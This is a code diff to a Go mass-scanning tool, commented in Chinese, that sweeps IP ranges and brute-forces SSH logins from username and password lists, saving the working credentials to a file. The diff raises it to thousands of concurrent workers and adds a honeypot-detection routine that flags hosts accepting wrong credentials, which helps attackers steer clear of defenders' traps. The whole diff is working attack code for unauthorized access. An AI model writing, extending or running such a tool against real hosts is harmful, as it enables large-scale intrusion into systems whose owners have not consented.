@@ -22,8 +22,8 @@ const (
 	userFile    = "user.txt"
 	passFile    = "passwd.txt"
 	resultFile  = "success.txt"
-	scanWorkers = 500
-	authWorkers = 200
+	scanWorkers = 5000
+	authWorkers = 2000
 )
 
 var (
@@ -54,19 +54,19 @@ func main() {
 	openIPs := make(chan string, 1000)
 	success := make(chan string, 1000)
 
-	var wg sync.WaitGroup
+	var scanWg, authWg sync.WaitGroup
 
 	// 啟動掃描池
 	go func() {
-		startScanPool(ipChan, openIPs, &wg)
-		wg.Wait()
+		startScanPool(ipChan, openIPs, &scanWg)
+		scanWg.Wait() // 等待所有掃描任務結束
 		close(openIPs)
 	}()
 
 	// 啟動認證池
 	go func() {
-		startAuthPool(openIPs, users, passwords, success, &wg)
-		wg.Wait()
+		startAuthPool(openIPs, users, passwords, success, &authWg)
+		authWg.Wait() // 等待所有認證任務結束
 		close(success)
 	}()
 
@@ -80,7 +80,7 @@ func main() {
 
 	for result := range success {
 		fmt.Println("[+] 成功登入:", result)
-		out.WriteString(result + "\n")
+		_, _ = out.WriteString(result + "\n")
 	}
 
 	fmt.Println("掃描結束")
@@ -109,7 +109,8 @@ func startAuthPool(openIPs <-chan string, users, passwords []string, success cha
 			defer wg.Done()
 			for ip := range openIPs {
 				if loginSSH(ip, users, passwords, success) {
-					break
+					// 如果某個IP驗證成功後就不再嘗試其它組合，直接處理下一個 IP
+					continue
 				}
 			}
 		}()
@@ -142,17 +143,51 @@ func loginSSH(ip string, users, passwords []string, success chan<- string) bool 
 			if err != nil {
 				continue
 			}
-			sshConn, chans, reqs, err := ssh.NewClientConn(conn, ip+":"+port, config)
+			sshConn, chans, reqs, err := ssh.NewClientConn(conn, net.JoinHostPort(ip, port), config)
 			if err != nil {
 				conn.Close()
 				fmt.Printf("[-] %s 登錄失敗 (%s/%s)\n", ip, user, pass)
 				continue
 			}
 			client := ssh.NewClient(sshConn, chans, reqs)
-			defer client.Close()
+			// 成功登入，開始進行蜜罐檢測（錯誤帳密嘗試3次）
+			honeypotCount := 0
+			for i := 0; i < 3; i++ {
+				// 隨機挑選一個帳密
+				fakeUser := users[rand.Intn(len(users))]
+				fakePass := passwords[rand.Intn(len(passwords))]
+				// 如果隨機到的與原本成功的相同則修改密碼確保錯誤
+				if fakeUser == user && fakePass == pass {
+					fakePass = fakePass + "_wrong"
+				}
+				fakeConfig := &ssh.ClientConfig{
+					User:            fakeUser,
+					Auth:            []ssh.AuthMethod{ssh.Password(fakePass)},
+					HostKeyCallback: ssh.InsecureIgnoreHostKey(),
+					Timeout:         timeout,
+				}
+				fakeConn, err := dialer.Dial("tcp", net.JoinHostPort(ip, port))
+				if err != nil {
+					continue
+				}
+				fakeSSHConn, _, _, err := ssh.NewClientConn(fakeConn, net.JoinHostPort(ip, port), fakeConfig)
+				if err == nil {
+					// 測試成功的次數累加
+					honeypotCount++
+					fmt.Printf("[!] %s 測試 %d/3 錯誤登入成功 (%s/%s)\n", ip, i+1, fakeUser, fakePass)
+					fakeSSHConn.Close()
+				} else {
+					fmt.Printf("[-] %s 測試 %d/3 錯誤登入被拒 (%s/%s)\n", ip, i+1, fakeUser, fakePass)
+				}
+			}
+
 			successMsg := fmt.Sprintf("%s@%s 密碼: %s", user, ip, pass)
+			if honeypotCount == 3 {
+				successMsg += " [可能為蜜罐：連續3次錯誤帳密皆可登入]"
+			}
 			fmt.Printf("[+] %s 登錄成功 (%s/%s)\n", ip, user, pass)
 			success <- successMsg
+			client.Close()
 			return true
 		}
 	}
@@ -198,6 +233,7 @@ func readIPFile(filename string) <-chan string {
 		}
 		for _, line := range lines {
 			if ip, ipnet, err := net.ParseCIDR(line); err == nil {
+				// 對於 CIDR 格式，每一個 IP 都要加入到 channel
 				for ip := ip.Mask(ipnet.Mask); ipnet.Contains(ip); inc(ip) {
 					out <- ip.String()
 				}
